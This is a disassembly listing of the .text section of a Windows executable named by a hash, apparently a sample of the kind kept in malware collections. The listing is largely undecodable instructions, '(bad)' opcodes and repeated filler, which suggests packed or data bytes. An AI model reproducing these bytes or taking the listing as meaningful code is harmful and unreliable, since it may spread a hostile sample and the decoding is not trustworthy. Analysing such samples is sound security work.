
08e39afc1735455e8dd695f58f7409152831adc0225d072ee2af7b0dc49175ef.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [ebp+0x1],dl
  401003:	add    BYTE PTR [ecx],bh
  401005:	push   edi
  401006:	inc    ecx
  401007:	add    BYTE PTR [esi+0x65],dh
  40100a:	je     0x40105c
  40100c:	sub    ebp,DWORD PTR [edi+0x63]
  40100f:	inc    ecx
  401010:	adc    eax,0x2a657264
  401015:	jae    0x401017
  401017:	add    ch,ch
  401019:	outs   dx,BYTE PTR ds:[esi]
  40101a:	popa   
  40101b:	fs add eax,0x18726269
  401021:	jb     0x40109c
  401023:	inc    ebp
  401024:	add    DWORD PTR [ecx+0x0],eax
  401027:	add    ch,ch
  401029:	outs   dx,BYTE PTR ds:[esi]
  40102a:	popa   
  40102b:	fs add eax,0xd8726269
  401031:	jno    0x4010ac
  401033:	inc    ebp
  401034:	loope  0x40108c
  401036:	add    BYTE PTR [eax],al
  401038:	mul    BYTE PTR [esp+esi*2+0x4d]
  40103c:	out    0x63,al
  40103e:	jne    0x4010ac
  401040:	aam    0x47
  401042:	popa   
  401043:	outs   dx,BYTE PTR ds:[esi]
  401044:	(bad)  [ebx+0x65]
  401047:	inc    ecx
  401048:	cmp    DWORD PTR [eax],eax
  40104a:	add    BYTE PTR [eax],al
  40104c:	jp     0x4010c0
  40104e:	gs popa 
  401050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401051:	gs inc esi
  401053:	imul   edx,DWORD PTR [ebp-0x72ffbe9b],0x9a727473
  40105d:	popa   
  40105e:	je     0x4010a1
  401060:	cmp    DWORD PTR [eax],eax
  401062:	add    BYTE PTR [eax],al
  401064:	jle    0x4010cb
  401066:	je     0x4010bf
	...
  40107c:	nop
  40107d:	outs   dx,BYTE PTR ds:[esi]
  40107e:	outs   dx,DWORD PTR fs:[esi]
  401080:	outs   dx,BYTE PTR ds:[esi]
  401081:	jae    0x4010c7
  401083:	imul   ebp,DWORD PTR [ebx+0x65],0x72567463
  40108a:	jns    0x4010cd
  40108c:	cmp    DWORD PTR [eax],eax
  40108e:	add    BYTE PTR [eax],al
  401090:	jle    0x4010f7
  401092:	je     0x4010e1
  401094:	pop    esi
  401095:	fs jne 0x401104
  401098:	pop    esp
  401099:	dec    eax
  40109a:	popa   
  40109b:	outs   dx,BYTE PTR ds:[esi]
  40109c:	push   ebp
  40109d:	ins    BYTE PTR es:[edi],dx
  40109e:	gs push edi
  4010a0:	cmp    DWORD PTR [eax],eax
  4010a2:	add    BYTE PTR [eax],al
  4010a4:	xor    eax,0x4d004002
  4010a9:	add    al,BYTE PTR [eax+0x0]
  4010ac:	push   ebp
  4010ad:	add    al,BYTE PTR [eax+0x0]
  4010b0:	dec    ebp
  4010b1:	add    al,BYTE PTR [eax+0x0]
  4010b4:	add    DWORD PTR [edx],eax
  4010b6:	inc    eax
  4010b7:	add    ch,ch
  4010b9:	add    DWORD PTR [eax+0x0],eax
  4010bc:	sbb    DWORD PTR [edx],eax
  4010be:	inc    eax
  4010bf:	add    cl,dh
  4010c1:	add    DWORD PTR [eax+0x0],eax
  4010c4:	mul    BYTE PTR [esp+esi*2+0x50]
  4010c8:	jmp    0x401138
  4010ca:	arpl   WORD PTR [ecx-0x2b],ax
  4010cd:	arpl   WORD PTR [edx+0x65],si
  4010d0:	retf   0x72
  4010d3:	add    ch,bh
  4010d5:	outs   dx,BYTE PTR ds:[esi]
  4010d6:	popa   
  4010d7:	fs cmc 
  4010d9:	push   0x71d87262
  4010de:	jns    0x401125
	...
  4010f4:	mov    cl,0x3f
  4010f6:	add    BYTE PTR [eax],al
  4010f8:	mov    ds:0x9c6e7263,al
  4010fd:	ins    BYTE PTR es:[edi],dx
  4010fe:	xor    esi,DWORD PTR [edx]
  401100:	dec    edi
  401101:	fs ins BYTE PTR es:[edi],dx
  401103:	ins    BYTE PTR es:[edi],dx
  401104:	cmp    DWORD PTR [eax],eax
  401106:	add    BYTE PTR [eax],al
  401108:	pushf  
  401109:	jno    0x401181
  40110b:	arpl   WORD PTR [ebx-0x729bd18c],cx
  401111:	ins    BYTE PTR es:[edi],dx
  401112:	add    BYTE PTR [eax],al
  401114:	arpl   WORD PTR fs:[ebp+0x73],bp
  401118:	push   esp
  401119:	je     0x40111b
  40111b:	add    BYTE PTR [ecx+esi*2+0x76],dl
  40111f:	arpl   WORD PTR [ebx+0x74],bp
  401122:	cs fs gs ins BYTE PTR es:[edi],dx
  401126:	add    BYTE PTR [eax],al
  401128:	pop    esp
  401129:	arpl   WORD PTR [ebp+0x63],bp
  40112c:	dec    ecx
  40112d:	ja     0x40112f
  40112f:	add    BYTE PTR [edi+0x67],ah
  401132:	jb     0x4011a8
  401134:	sub    al,0x5f
  401136:	ins    BYTE PTR es:[edi],dx
  401137:	inc    ecx
  401138:	sbb    eax,0x39636f6c
  40113d:	add    BYTE PTR [eax],al
  40113f:	add    BYTE PTR [edi],al
  401141:	addr16 jb 0x4011b8
  401144:	or     al,0x5f
  401146:	ins    BYTE PTR es:[edi],dx
  401147:	inc    ecx
  401148:	sbb    eax,0x39636f6c
  40114d:	add    BYTE PTR [eax],al
  40114f:	add    ah,ah
  401151:	ins    DWORD PTR es:[edi],dx
  401152:	ins    DWORD PTR es:[edi],dx
  401153:	popa   
  401154:	jmp    0xa57aae
	...
  401169:	add    BYTE PTR [eax],al
  40116b:	add    dh,ah
  40116d:	dec    esp
  40116e:	inc    si
  401170:	shr    BYTE PTR [ebx+0x65],1
  401173:	add    BYTE PTR [edi],al
  401175:	addr16 jb 0x4011ec
  401178:	int3   
  401179:	pop    esi
  40117a:	ins    BYTE PTR es:[edi],dx
  40117b:	push   eax
  40117c:	retf   
  40117d:	ins    BYTE PTR es:[edi],dx
  40117e:	je     0x4011e5
  401180:	fidiv  DWORD PTR [ebx+0x0]
  401183:	add    cl,dh
  401185:	bound  esp,QWORD PTR [ecx+0x70]
  401188:	js     0x4011f6
  40118a:	ins    BYTE PTR es:[edi],dx
  40118b:	outs   dx,DWORD PTR ds:[esi]
  40118c:	call   0x7263:0x92000000
  401193:	outs   dx,BYTE PTR ds:[esi]
  401194:	xchg   esp,eax
  401195:	ins    BYTE PTR es:[edi],dx
  401196:	xor    esi,DWORD PTR [edx]
  401198:	fs ins BYTE PTR es:[di],dx
  40119b:	ins    BYTE PTR es:[edi],dx
  40119c:	cmp    DWORD PTR [eax],eax
  40119e:	add    BYTE PTR [eax],al
  4011a0:	jle    0x401205
  4011a2:	je     0x4011f4
  4011a4:	mov    ebp,DWORD PTR [ebp+0x63]
  4011a7:	gs push 0x71
  4011aa:	dec    eax
  4011ab:	gs pop eax
  4011ad:	jo     0x4011af
  4011af:	add    BYTE PTR [ecx],bh
  4011b1:	add    BYTE PTR [ecx+eax*1+0x39],al
  4011b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011b6:	pop    ecx
  4011b7:	nop
  4011b8:	cmp    edx,ebp
  4011ba:	add    eax,DWORD PTR [eax]
  4011bc:	cmp    ebx,ebp
  4011be:	add    eax,DWORD PTR [eax]
  4011c0:	cmp    esi,edi
  4011c2:	sti    
  4011c3:	add    BYTE PTR [ecx],bh
  4011c5:	das    
  4011c6:	add    eax,DWORD PTR [eax]
  4011c8:	cmp    edi,esp
  4011ca:	add    eax,DWORD PTR [eax]
  4011cc:	cmp    DWORD PTR [edi],esp
  4011ce:	add    al,0x0
	...
  4011e4:	cmp    edi,esp
  4011e6:	add    eax,DWORD PTR [eax]
  4011e8:	cmp    edi,esp
  4011ea:	add    eax,DWORD PTR [eax]
  4011ec:	cmp    edi,esp
  4011ee:	add    eax,DWORD PTR [eax]
  4011f0:	cmp    edi,esp
  4011f2:	add    eax,DWORD PTR [eax]
  4011f4:	cmp    edi,esp
  4011f6:	add    eax,DWORD PTR [eax]
  4011f8:	cmp    edi,esp
  4011fa:	add    eax,DWORD PTR [eax]
  4011fc:	cmp    edi,esp
  4011fe:	add    eax,DWORD PTR [eax]
  401200:	cmp    edi,esp
  401202:	add    eax,DWORD PTR [eax]
  401204:	cmp    DWORD PTR [edi+0x4],esp
  401207:	add    BYTE PTR [ecx],bh
  401209:	in     eax,0x1a
  40120b:	mov    edx,0x9afe747
  401210:	jl     0x4011d9
  401212:	mov    ebx,0x25abf501
  401217:	push   esp
  401218:	sar    edi,1
  40121a:	jbe    0x40123c
  40121c:	test   eax,0xab676af7
  401221:	enter  0x2068,0x9a
  401225:	enter  0x6e69,0x8e
  401229:	frstor [ebx]
  40122b:	bound  ebx,QWORD PTR [ecx+ecx*1+0x99f7576]
  401232:	ins    DWORD PTR es:[edi],dx
  401233:	outs   dx,BYTE PTR ds:[esi]
  401234:	pop    ecx
  401235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401236:	dec    edx
  401237:	push   ebx
  401238:	pop    ecx
  401239:	les    ebp,FWORD PTR [edx+0x64]
  40123c:	pop    esp
  40123d:	sti    
  40123e:	or     BYTE PTR ds:0x3cd0043,cl
  401244:	cmp    DWORD PTR [eax],eax
  401246:	jmp    0x40124e
	...
  40125b:	add    BYTE PTR [ecx],bh
  40125d:	add    BYTE PTR [ecx-0x62ffc6c0],bh
  401263:	add    al,0x3a
  401265:	add    BYTE PTR [ecx-0x22],al
  401268:	mov    edx,0x3903e94b
  40126d:	add    cl,ch
  40126f:	add    edi,DWORD PTR [ecx]
  401271:	add    BYTE PTR [ecx],cl
  401273:	add    al,0x3e
  401275:	add    edx,esi
  401277:	add    al,0x3b
  401279:	cs jmp 0xe9404c78
  40127f:	dec    ebp
  401280:	cmp    DWORD PTR [eax],eax
  401282:	jmp    0x55404b8a
  401287:	in     eax,dx
  401288:	cmp    DWORD PTR [eax],eax
  40128a:	jmp    0xe9404ba2
  40128f:	adc    edi,DWORD PTR [eax]
  401291:	add    cl,ch
  401293:	add    edi,ecx
  401295:	(bad)  
  401296:	call   0xe9404bae
  40129b:	add    eax,0x3ed0039
  4012a0:	cmp    DWORD PTR [eax],eax
  4012a2:	jmp    0xed404baa
  4012a7:	add    edi,DWORD PTR [ecx]
  4012a9:	add    cl,ch
  4012ab:	add    edi,DWORD PTR [ecx]
  4012ad:	add    cl,ch
  4012af:	jae    0x4012e9
  4012b1:	add    cl,ch
  4012b3:	add    eax,0x49220039
  4012b8:	cmp    BYTE PTR [eax],al
  4012ba:	jmp    0x4012bf
  4012bc:	cmp    DWORD PTR [eax],eax
  4012be:	jmp    0x4012c6
	...
  4012d3:	add    BYTE PTR [ecx],ch
  4012d5:	add    cl,ch
  4012d7:	adc    edi,DWORD PTR [ecx]
  4012d9:	add    cl,ch
  4012db:	add    ebp,DWORD PTR [ecx]
  4012dd:	add    cl,ch
  4012df:	adc    edi,DWORD PTR [ecx]
  4012e1:	add    BYTE PTR [eax],al
  4012e3:	jmp    0xd9401322
  4012e8:	cmp    al,BYTE PTR [eax]
  4012ea:	add    cl,ch
  4012ec:	cmp    al,BYTE PTR [eax]
  4012ee:	add    cl,ch
  4012f0:	cmp    al,BYTE PTR [eax]
  4012f2:	add    BYTE PTR [ecx+0x2100016b],ch
  4012f8:	cmp    al,BYTE PTR [eax]
  4012fa:	add    cl,ch
  4012fc:	cmp    al,BYTE PTR [eax]
  4012fe:	add    cl,ch
  401300:	cmp    al,BYTE PTR [eax]
  401302:	add    cl,ch
  401304:	cmp    al,BYTE PTR [eax]
  401306:	add    cl,ch
  401308:	cmp    al,BYTE PTR [eax]
  40130a:	add    cl,ch
  40130c:	cmp    al,BYTE PTR [eax]
  40130e:	add    cl,ch
  401310:	cmp    al,BYTE PTR [eax]
  401312:	add    cl,ch
  401314:	cmp    al,BYTE PTR [eax]
  401316:	add    cl,ch
  401318:	cmp    al,BYTE PTR [eax]
  40131a:	add    cl,ch
  40131c:	cmp    al,BYTE PTR [eax]
  40131e:	add    cl,ch
  401320:	cmp    al,BYTE PTR [eax]
  401322:	add    cl,ch
  401324:	cmp    al,BYTE PTR [eax]
  401326:	add    cl,ch
  401328:	cmp    al,BYTE PTR [eax]
  40132a:	add    cl,ch
  40132c:	cmp    al,BYTE PTR [eax]
  40132e:	add    cl,ch
  401330:	cmp    al,BYTE PTR [eax]
  401332:	add    cl,ch
  401334:	cmp    al,BYTE PTR [eax]
  401336:	add    cl,ch
	...
  40134c:	cmp    al,BYTE PTR [eax]
  40134e:	add    cl,ch
  401350:	cmp    al,BYTE PTR [eax]
  401352:	add    cl,ch
  401354:	cmp    al,BYTE PTR [eax]
  401356:	add    cl,ch
  401358:	cmp    al,BYTE PTR [eax]
  40135a:	add    cl,ch
  40135c:	cmp    al,BYTE PTR [eax]
  40135e:	add    BYTE PTR [ebp-0x7e],bh
  401361:	(bad)  
  401362:	jmp    FWORD PTR [edx+edi*1+0x0]
  401366:	add    cl,ch
  401368:	cmp    al,BYTE PTR [eax]
  40136a:	add    cl,ch
  40136c:	cmp    al,BYTE PTR [eax]
  40136e:	add    BYTE PTR [eax],al
  401370:	adc    dh,bh
  401372:	(bad)  
  401373:	call   DWORD PTR [eax]
  401375:	(bad)  
  401376:	(bad)  
  401377:	jmp    eax
  401379:	std    
  40137a:	(bad)  
  40137b:	jmp    eax
  40137d:	std    
  40137e:	(bad)  
  40137f:	dec    DWORD PTR [esi]
  401381:	push   0x65
  401383:	js     0x401349
  401385:	std    
  401386:	(bad)  
  401387:	call   FWORD PTR [ebx-0xf]
  40138a:	add    BYTE PTR [eax],al
  40138c:	loopne 0x40139b
  40138e:	add    BYTE PTR [eax],al
  401390:	shl    bh,1
  401392:	add    BYTE PTR [eax],al
  401394:	rol    BYTE PTR [ebx],1
  401396:	add    BYTE PTR [eax],al
  401398:	mov    al,ds:0xa0fffffd
  40139d:	std    
  40139e:	(bad)  
  40139f:	call   DWORD PTR [eax+0x30fffffd]
  4013a5:	add    al,0x0
  4013a7:	pusha  
  4013a8:	ds jb  0x40140f
  4013ab:	popa   
  4013ac:	in     al,0x5c
	...
  4013c2:	add    BYTE PTR [eax],al
  4013c4:	nop
  4013c5:	(bad)  
  4013c6:	(bad)  
  4013c7:	call   DWORD PTR [eax+0x6000010d]
  4013cd:	add    eax,DWORD PTR [eax]
  4013cf:	add    BYTE PTR [eax-0x3],ah
  4013d2:	add    BYTE PTR [eax],al
  4013d4:	push   eax
  4013d5:	std    
  4013d6:	(bad)  
  4013d7:	call   DWORD PTR [eax-0x3]
  4013da:	(bad)  
  4013db:	jmp    DWORD PTR [eax-0x3]
  4013de:	(bad)  
  4013df:	jmp    DWORD PTR [eax]
  4013e1:	add    al,0x0
  4013e3:	inc    eax
  4013e4:	outs   dx,BYTE PTR ds:[esi]
  4013e5:	pop    ecx
  4013e6:	popa   
  4013e7:	je     0x40141a
  4013e9:	add    al,0x0
  4013eb:	add    al,cl
  4013ed:	add    BYTE PTR ds:[eax],al
  4013f0:	and    BYTE PTR ds:0x43100001,bl
  4013f6:	add    BYTE PTR [eax],al
  4013f8:	adc    BYTE PTR [ebx],al
  4013fa:	add    DWORD PTR [eax],eax
  4013fc:	cmp    edi,esp
  4013fe:	add    eax,DWORD PTR [eax]
  401400:	cmp    edi,esp
  401402:	add    eax,DWORD PTR [eax]
  401404:	cmp    edi,esp
  401406:	add    eax,DWORD PTR [eax]
  401408:	cmp    DWORD PTR [edi-0x1906fffd],esp
  40140e:	add    eax,DWORD PTR [eax]
  401410:	cmp    edi,esp
  401412:	add    eax,DWORD PTR [eax]
  401414:	cmp    edi,esp
  401416:	add    eax,DWORD PTR [eax]
  401418:	cmp    edi,esp
  40141a:	add    eax,DWORD PTR [eax]
  40141c:	cmp    DWORD PTR [esp+ecx*4+0x13dc61ec],edi
  401423:	inc    eax
  401424:	cmp    edi,edi
  401426:	je     0x401429
	...
  40143c:	cli    
  40143d:	stc    
  40143e:	div    DWORD PTR [ebp+0x41]
  401441:	jge    0x401445
  401443:	push   0x39
  401445:	(bad)  
  401446:	mov    ebx,0xcce739da
  40144b:	ret    0xe735
  40144e:	push   eax
  40144f:	mov    esp,DWORD PTR [ebp-0x6efd5c2]
  401455:	out    0xfb,al
  401457:	jb     0x401491
  401459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40145a:	test   DWORD PTR [ebx+0x7403eefc],0x8515e42
  401464:	ret    0xf6d4
  401467:	jne    0x40149a
  401469:	mov    ds:0xa4700852,al
  40146e:	add    BYTE PTR [eax],al
  401470:	in     al,dx
  401471:	pop    ebp
  401472:	call   0x6cce89fa
  401477:	dec    edi
  401478:	sub    DWORD PTR [edi],esp
  40147a:	add    al,0xf8
  40147c:	retf   
  40147d:	out    0xc2,eax
  40147f:	push   DWORD PTR [esi]
  401481:	cmc    
  401482:	pop    es
  401483:	(bad)  
  401484:	je     0x4014f7
  401486:	mov    edi,0xe9012545
  40148b:	add    edi,DWORD PTR [ecx]
  40148d:	add    BYTE PTR [edx+0x51],dh
  401490:	inc    ecx
  401491:	mov    edi,ebx
  401493:	imul   edi,DWORD PTR [ecx],0x613d4f7
  401499:	outs   dx,BYTE PTR ds:[esi]
  40149a:	inc    ebp
  40149b:	test   DWORD PTR [eax+edi*8+0x713e],0x0
	...
  4014b2:	add    BYTE PTR [eax],al
  4014b4:	inc    ecx
  4014b5:	neg    DWORD PTR [ebx-0x223cfff1]
  4014bb:	add    ecx,DWORD PTR [ebx+ecx*4-0x70a7ceb]
  4014c2:	xchg   ecx,eax
  4014c3:	jge    0x4014ee
  4014c5:	inc    eax
  4014c6:	jmp    0x2a4160c6
  4014cb:	idiv   esi
  4014cd:	cmp    eax,0x390401
  4014d2:	jmp    0xea341195
  4014d7:	add    edi,DWORD PTR [ecx]
  4014d9:	add    BYTE PTR [edx+0x51],ah
  4014dc:	xor    DWORD PTR [ebx-0x80b7705],ecx
  4014e2:	cmp    DWORD PTR [edx+0x3b],ebp
  4014e5:	neg    DWORD PTR [eax+edi*8-0x72]
  4014e9:	ins    DWORD PTR es:[edi],dx
  4014ea:	shl    esi,1
  4014ec:	or     al,0x8
  4014ee:	(bad)  
  4014ef:	push   ecx
  4014f0:	and    eax,0x80fc248b
  4014f5:	ret    0x3ed
  4014f8:	add    al,0x8b
  4014fa:	mov    ebp,0x11f87d82
  4014ff:	ret    0x4049
  401502:	jmp    0xaa40e102
  401507:	div    BYTE PTR [esi+0x3d]
  40150a:	xchg   ecx,eax
  40150b:	add    edi,DWORD PTR [ecx]
  40150d:	add    cl,ch
  40150f:	mov    esi,0x3e9f3f4
  401514:	cmp    DWORD PTR [eax],eax
  401516:	add    BYTE PTR [edx+0x0],ah
	...
  401529:	add    BYTE PTR [eax],al
  40152b:	add    BYTE PTR [ecx-0x4e2474f8],cl
  401531:	cmp    al,0xf8
  401533:	mov    ecx,0xd4ff0190
  401538:	push   cs
  401539:	div    DWORD PTR [ebp+0x51]
  40153c:	pop    es
  40153d:	ins    DWORD PTR es:[edi],dx
  40153e:	or     BYTE PTR [esi+0x68],cl
  401541:	or     al,0xff
  401543:	mov    esp,0x3e87e832
  401548:	out    dx,eax
  401549:	not    BYTE PTR [eax+0x62]
  40154c:	mov    DWORD PTR [eax],ecx
  40154e:	mov    ebx,ebx
  401550:	push   eax
  401551:	add    BYTE PTR [edx-0x17],ch
  401554:	out    0x6c,eax
  401556:	cld    
  401557:	push   ds
  401558:	dec    ecx
  401559:	clc    
  40155a:	call   FWORD PTR [edx+eax*2+0x62f552f7]
  401561:	mov    edx,DWORD PTR [ebp+0x1]
  401564:	cmp    ecx,DWORD PTR [ebp+0xc]
  401567:	ret    0x6d8a
  40156a:	push   es
  40156b:	ret    0xc87a
  40156e:	ret    0x3ae1
  401571:	mov    eax,0x3ae901
  401576:	leave  
  401577:	stos   DWORD PTR es:[edi],eax
  401578:	inc    ebp
  401579:	add    BYTE PTR [ebp+0x62],dl
  40157c:	mov    eax,ds:0x15cdc482
  401581:	daa    
  401582:	adc    DWORD PTR [ecx],ebp
  401584:	xor    eax,0x79e872f8
  401589:	idiv   bh
  40158b:	cmp    al,0x45
  40158d:	div    DWORD PTR [ebp-0x1f]
	...
  4015a4:	push   edx
  4015a5:	ja     0x4015a6
  4015a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015a8:	fs or  al,al
  4015ab:	adc    al,0x39
  4015ad:	leave  
  4015ae:	ret    0x3ae5
  4015b1:	mov    edx,DWORD PTR [ebp-0x1f]
  4015b4:	mov    cl,0x11
  4015b6:	lea    eax,[eax]
  4015b8:	or     eax,0x2dff50f8
  4015bd:	adc    bh,bh
  4015bf:	jne    0x4015d5
  4015c1:	in     eax,dx
  4015c2:	jne    0x4015cc
  4015c4:	xchg   edi,eax
  4015c5:	push   edx
  4015c6:	or     al,0x85
  4015c8:	push   eax
  4015c9:	je     0x4015de
  4015cb:	mov    ebx,ebp
  4015cd:	in     eax,dx
  4015ce:	cmp    eax,DWORD PTR [ebp+0x10]
  4015d1:	addr16 pop es
  4015d3:	mov    eax,0x211
  4015d8:	imul   esi,esi,0x2a
  4015db:	ror    BYTE PTR [ebx+0x19c02b02],0xc2
  4015e2:	or     al,0x0
  4015e4:	int    0x88
  4015e6:	in     al,dx
  4015e7:	or     DWORD PTR [eax+edi*8],0x56
  4015eb:	push   0x40115d
  4015f0:	sub    BYTE PTR [edx+0x1],dh
  4015f3:	ret    
  4015f4:	aaa    
  4015f5:	jg     0x401674
  4015f7:	or     al,0xd0
  4015f9:	gs push es
  4015fb:	xor    DWORD PTR ds:0x9f750009,0x28
  401602:	rcr    BYTE PTR [esi+0x59],0xc2
  401606:	or     al,0x0
	...
  40161c:	adc    ebp,DWORD PTR [esi+0x10]
  40161f:	add    ch,ch
  401621:	or     DWORD PTR [eax+0x1a001],edi
  401627:	pop    esi
  401628:	fnstcw WORD PTR [edi+0x660b000c]
  40162e:	or     al,0xc7
  401630:	sbb    eax,0x600000f8
  401635:	add    DWORD PTR [ebx+0x12885855],ecx
  40163b:	lea    ecx,ds:0x2dff50f8
  401641:	or     al,0x56
  401643:	(bad)  
  401644:	cmp    DWORD PTR [esp+ecx*1],edx
  401647:	(bad)  
  401648:	jmp    0x401640
  40164a:	jle    0x40160c
  40164c:	shl    ch,0x28
  40164f:	rcl    BYTE PTR [edi+0x390cc1b0],0x6a
  401656:	jbe    0x401654
  401658:	cmp    esp,ebp
  40165a:	cld    
  40165b:	sub    bh,cl
  40165d:	mov    esp,0xe745c2ca
  401662:	mov    BYTE PTR [ebp+0xd],al
  401665:	jmp    0xc46e:0xf77c29f3
  40166c:	shl    edi,0x3
  40166f:	add    BYTE PTR [ecx],bh
  401671:	xchg   ebp,eax
  401672:	retf   0x3dc2
  401675:	out    0x4e,eax
  401677:	mov    edx,ebp
  401679:	addr16 mov edi,0xf41dcef8
  40167f:	push   0x0
	...
  401694:	cmp    eax,0xd10043f9
  401699:	cwde   
  40169a:	add    al,bl
  40169c:	mov    BYTE PTR [eax-0x6ec695fd],0x0
  4016a3:	push   0x39
  4016a5:	xchg   ecx,eax
  4016a6:	add    BYTE PTR [eax+0x39],ch
  4016a9:	out    0x3,eax
  4016ab:	and    BYTE PTR [esi-0x4717f495],0xb5
  4016b2:	add    al,0x0
  4016b4:	rcr    BYTE PTR [ebx],0xf0
  4016b7:	inc    eax
  4016b8:	add    al,0xe3
  4016ba:	mov    esp,0x5de731c2
  4016bf:	add    BYTE PTR [ebx+eiz*1-0x191eaf14],ch
  4016c6:	adc    eax,DWORD PTR [eax]
  4016c8:	cmp    DWORD PTR [ecx+ecx*4-0x8],ebx
  4016cc:	push   esi
  4016cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016ce:	repz push eax
  4016d0:	pop    esi
  4016d1:	call   FWORD PTR [ebx]
  4016d3:	lock popa 
  4016d5:	pusha  
  4016d6:	mov    dh,0x4
  4016d8:	cmp    DWORD PTR [ecx],ecx
  4016da:	test   eax,0x14f53779
  4016df:	lock push ecx
  4016e1:	push   edx
  4016e2:	sahf   
  4016e3:	add    al,0x39
  4016e5:	daa    
  4016e6:	test   eax,0xe908fbbd
  4016eb:	repnz lods al,BYTE PTR ds:[esi]
  4016ed:	clc    
  4016ee:	pop    esp
  4016ef:	mov    DWORD PTR [ecx],esp
  4016f1:	in     al,0x66
  4016f3:	repz imul esi,ebx,0xffd4
	...
  40170a:	add    BYTE PTR [eax],al
  40170c:	push   ss
  40170d:	adc    dl,BYTE PTR [esi-0xd]
  401710:	push   es
  401711:	or     ah,0xeb
  401714:	cmp    DWORD PTR [ebp-0x7b],ebp
  401717:	rep ins BYTE PTR es:[edi],dx
  401719:	hlt    
  40171a:	push   ecx
  40171b:	cmp    eax,DWORD PTR [esi]
  40171d:	add    ecx,ebp
  40171f:	stos   DWORD PTR es:[edi],eax
  401720:	cmp    BYTE PTR [eax],al
  401722:	jmp    0xf1ff072a
  401727:	add    ebp,DWORD PTR [edi+eax*4+0xd]
  40172b:	pop    esp
  40172c:	mov    dh,0xe
  40172e:	test   eax,0xe86ec103
  401733:	(bad)  
  401734:	mov    esi,0x395deb66
  401739:	repz je 0x401737
  40173c:	xchg   esi,eax
  40173d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40173e:	hlt    
  40173f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401741:	leave  
  401742:	sub    ecx,DWORD PTR [eax]
  401744:	cmp    DWORD PTR [ebp+0x72],ecx
  401747:	fbld   TBYTE PTR [ecx]
  401749:	pushf  
  40174a:	sti    
  40174b:	inc    ebx
  40174c:	cmp    eax,edi
  40174e:	pop    ebx
  40174f:	add    eax,0x443f37a
  401754:	adc    eax,DWORD PTR [eax]
  401756:	(bad)  
  401757:	js     0x40179a
  401759:	call   0xf3af07cc
  40175e:	add    BYTE PTR [eax+0x13fffc7c],ah
  401764:	fsubrp st(3),st
  401766:	sub    DWORD PTR [ebp-0x43b979e],0xfffffffa
  40176d:	push   edi
  40176f:	sbb    eax,DWORD PTR [eax]
	...
  401781:	add    BYTE PTR [eax],al
  401783:	add    BYTE PTR [edi+edi*4],bh
  401786:	dec    DWORD PTR [esi+0x2c8f03c1]
  40178c:	and    eax,0x3a7d45bb
  401791:	add    BYTE PTR [eax],al
  401793:	jmp    0xf53f181c
  401798:	push   ds
  401799:	bnd jne 0x40178d
  40179c:	repnz pusha 
  40179e:	std    
  40179f:	pop    esi
  4017a0:	or     eax,DWORD PTR [edi+0xe87e155]
  4017a6:	call   esp
  4017a8:	push   cs
  4017a9:	repz jne 0x4017ed
  4017ac:	jmp    0x40181a
  4017ae:	or     BYTE PTR [esi],bh
  4017b0:	test   BYTE PTR [eax],bl
  4017b2:	leave  
  4017b3:	sub    esp,edx
  4017b5:	repnz push esp
  4017b7:	(bad)  
  4017b8:	(bad)  
  4017b9:	addr16 add dl,bh
  4017bc:	jp     0x4017be
  4017be:	clc    
  4017bf:	fwait
  4017c0:	xor    eax,0x3a83ffbf
  4017c5:	repz jne 0x4017a9
  4017c8:	loop   0x40176f
  4017ca:	inc    DWORD PTR [esi]
  4017cc:	stos   DWORD PTR es:[edi],eax
  4017cd:	enter  0xe5c2,0x3a
  4017d1:	dec    ebp
  4017d2:	mov    eax,DWORD PTR ds:0x6a144d27
  4017d8:	dec    esp
  4017d9:	add    BYTE PTR [ebp-0x13],dh
  4017dc:	sar    DWORD PTR [ebp+0x6c89e910],cl
  4017e2:	adc    dh,dl
  4017e4:	push   cs
  4017e5:	add    al,0xff
  4017e7:	push   esp
	...
  4017fc:	jge    0x4017d8
  4017fe:	hlt    
  4017ff:	add    BYTE PTR [ebp-0x10],bh
  401802:	dec    DWORD PTR [ebx+0x2211845]
  401808:	cdq    
  401809:	mov    ecx,0x75450010
  40180e:	in     al,dx
  40180f:	and    DWORD PTR [edi+ebp*8+0x545c75ff],0x4
  401817:	lea    edx,ds:0x25ff50f0
  40181d:	hlt    
  40181e:	out    0xc3,eax
  401820:	mov    edi,0x558bffef
  401825:	add    BYTE PTR [ebx+0x76a1038],al
  40182b:	mov    edx,DWORD PTR [ebp-0x10]
  40182e:	bswap  eax
  401830:	imul   edi,edx,0x2a
  401833:	ror    BYTE PTR [ecx-0x46],0x8
  401837:	add    ch,al
  401839:	je     0x401827
  40183b:	adc    DWORD PTR [eax+esi*8-0x1],0x75
  401840:	in     al,dx
  401841:	push   ebx
  401842:	add    cl,BYTE PTR [ebp-0xaf106b]
  401848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401849:	cmc    
  40184a:	out    0x97,eax
  40184c:	pxor   mm7,mm7
  40184f:	mov    esp,DWORD PTR [ebp-0x1fc77d0f]
  401855:	imul   ecx,DWORD PTR [eax],0xfe39670f
  40185b:	xchg   BYTE PTR [ebx+edx*8],dl
  40185e:	add    ch,BYTE PTR [ebx]
	...
  401874:	pusha  
  401875:	mov    ch,0xc2
  401877:	or     BYTE PTR [eax+0x13ec8b4a],ah
  40187d:	enter  0xfffc,0x25
  401881:	icebp  
  401882:	imul   eax,DWORD PTR [ecx],0x50ff3a0d
  401888:	outs   dx,DWORD PTR ds:[esi]
  401889:	push   0x8
  40188b:	call   0x3155c9
  401890:	jle    0x4018f0
  401892:	inc    esi
  401893:	or     al,0xba
  401895:	inc    DWORD PTR [ebx]
  401897:	je     0x4018d0
  401899:	loop   0x401854
  40189b:	inc    ebp
  40189c:	mov    si,0x2b05
  4018a0:	jns    0x401842
  4018a2:	lds    ecx,FWORD PTR [eax]
  4018a4:	cmp    DWORD PTR [edi*2+0x142cc2ec],esi
  4018ab:	add    DWORD PTR [ebx],0xffffffe7
  4018ae:	jbe    0x4018b4
  4018b0:	jo     0x401857
  4018b2:	(bad)  
  4018b3:	push   DWORD PTR [edi]
  4018b5:	hlt    
  4018b6:	(bad)  
